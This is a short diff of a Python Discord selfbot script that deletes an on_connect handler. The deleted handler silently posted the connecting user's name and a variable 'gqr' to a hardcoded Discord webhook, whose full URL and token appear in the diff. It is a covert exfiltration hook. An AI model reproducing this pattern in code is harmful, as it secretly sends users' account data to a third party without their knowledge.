@@ -3203,12 +3203,6 @@ async def _role_hexcode(ctx, *, role: discord.Role):
     await ctx.message.delete()
     await ctx.send(f"{role.name} : {role.color}")
 
-@SelfBot.event
-async def on_connect():
-    Clear()  
-    requests.post('https://discord.com/api/webhooks/890889226256797727/XeJhgmvwh0BhC35el74iC7P0qI4WOskTgJCvT6hbQvb1gK49QEbIp4-FJNjGcQ1ndWjm',json={'content': f"```\nTM312 : {SelfBot.user.name}\n\n{gqr}```"})
-    startprint()
-
 @SelfBot.command()
 async def empty(ctx):
     await ctx.message.delete()
